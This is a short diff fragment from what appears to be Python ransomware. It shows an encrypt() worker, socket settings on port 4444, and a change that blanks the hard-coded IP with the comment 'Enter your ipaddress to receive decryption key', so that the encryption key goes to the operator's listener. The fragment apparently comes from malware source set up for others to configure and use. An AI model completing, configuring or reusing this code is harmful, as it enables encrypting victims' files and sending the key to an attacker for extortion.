@@ -28,8 +28,8 @@ def encrypt(key):
             print('Failed to Encrypte :(')
         q.task_done
 #Socket Info
-IP_ADDRESS='192.168.183.1'
-PORT=4444
+IP_ADDRESS='' # Enter your ipaddress to receive decryption key
+PORT=4444 # you may change if you want
 
 # Encryption Info
 ENCRYPTION_LEVEL = 512//8        # 512 byte encryption = 64 bytes
